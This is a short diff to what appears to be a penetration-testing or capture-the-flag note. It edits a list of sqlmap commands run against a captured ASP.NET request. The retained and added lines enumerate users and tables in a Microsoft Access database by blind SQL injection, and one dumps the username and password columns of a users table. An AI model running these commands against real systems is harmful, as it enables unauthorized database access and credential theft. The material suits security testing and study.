@@ -22,16 +22,7 @@ __VIEWSTATE=%2FwEPDwUKMTYzNDg3OTA4NmRk&after=&before=1*
 ```
 ```
 ./sqlmap.py -r session.txt --banner
-./sqlmap.py -r session.txt --banner --technique=U
-./sqlmap.py -r session.txt --banner --technique=U --level 3 --risk 3
-./sqlmap.py -r session.txt --banner --level 3 --risk 3
-./sqlmap.py -r session.txt --banner --level 3 --risk 3
-./sqlmap.py -r session.txt --banner --level 3 --risk 3
-./sqlmap.py -r session.txt --users --level 3 --risk 3 --technique=B --dbms Microsoft Access
 ./sqlmap.py -r session.txt --users --level 3 --risk 3 --technique=B --dbms "Microsoft Access"
 ./sqlmap.py -r session.txt --tables --level 3 --risk 3 --technique=B --dbms "Microsoft Access"
-./sqlmap.py -r session2.txt --tables --level 3 --risk 3  --dbms "Microsoft Access"
-./sqlmap.py -r session2.txt --tables --level 3 --risk 3  --dbms "Microsoft Access" --code=302
-./sqlmap.py -r session2.txt --tables --level 3 --risk 3  --dbms "Microsoft Access" --code=302 --techniqu=B
-./sqlmap.py -r session2.txt --tables --level 3 --risk 3  --dbms "Microsoft Access" --code=302 --techniqu=B -p uid
+./sqlmap.py -r session.txt --columns --level 3 --risk 3 --technique=B --dbms "Microsoft Access"  -T users -C username,password --dump
 ```
